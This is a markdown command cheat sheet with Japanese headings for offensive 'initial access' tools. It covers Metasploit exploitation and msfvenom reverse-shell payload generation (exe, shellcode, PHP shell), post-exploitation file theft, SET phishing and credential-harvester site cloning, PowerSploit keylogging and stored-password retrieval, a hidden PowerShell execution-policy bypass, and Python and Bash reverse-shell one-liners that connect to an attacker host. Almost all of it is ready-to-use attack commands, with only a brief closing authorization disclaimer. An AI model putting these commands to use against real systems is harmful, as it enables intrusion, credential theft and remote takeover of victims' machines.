# Initial Access Tools Command Reference

## Metasploit Framework

### 基本操作
```bash
# Metasploitの起動
msfconsole

# データベース初期化
msfdb init

# ワークスペース管理
workspace -a <name>
workspace -d <name>
workspace -l
```

### 情報収集
```bash
# モジュール検索
search <keyword>
search type:exploit platform:windows

# モジュール情報表示
info <module_path>

# ターゲットリスト表示
show targets
```

### エクスプロイト実行
```bash
# モジュール選択
use <module_path>

# オプション設定
show options
set RHOSTS <target>
set LHOST <attacker>
set LPORT <port>

# エクスプロイト実行
exploit
run
```

### ペイロード生成
```bash
# 実行ファイル生成
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f exe > payload.exe

# シェルコード生成
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f c

# Webペイロード
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f raw > shell.php
```

### Post Exploitation
```bash
# システム情報収集
sysinfo
getuid
getprivs

# ファイル操作
download <remote_file> <local_path>
upload <local_file> <remote_path>
cat <file>

# シェル操作
shell
background
sessions -l
sessions -i <id>
```

## Social Engineering Toolkit (SET)

### 基本操作
```bash
# SET起動
setoolkit

# メニュー選択
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
```

### フィッシングメール
```bash
# メールテンプレート作成
1) Spear-Phishing Attack Vectors
2) Create a FileFormat Payload
3) Social-Engineering Template
```

### 偽装サイト
```bash
# クローンサイト作成
1) Website Attack Vectors
2) Credential Harvester Attack Method
3) Site Cloner
```

## PowerSploit

### PowerShell攻撃
```powershell
# モジュールインポート
Import-Module PowerSploit

# 権限昇格チェック
Get-GPPPassword
Get-UnattendedInstallFile

# キーロガー
Get-Keystrokes

# PowerShellバイパス
PowerShell.exe -NoP -NonI -W Hidden -Exec Bypass
```

## HackTheBox Tools

### 基本的なリバースシェル
```bash
# Netcat リスナー
nc -lvnp <port>

# Python リバースシェル
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Bash リバースシェル
bash -i >& /dev/tcp/<attacker>/<port> 0>&1
```

## 注意事項
- これらのツールは許可された環境でのみ使用してください
- マルウェアの生成と使用は違法となる可能性があります
- 実環境での使用は必ず許可を得てから行ってください
- アンチウイルスソフトに検知される可能性があります 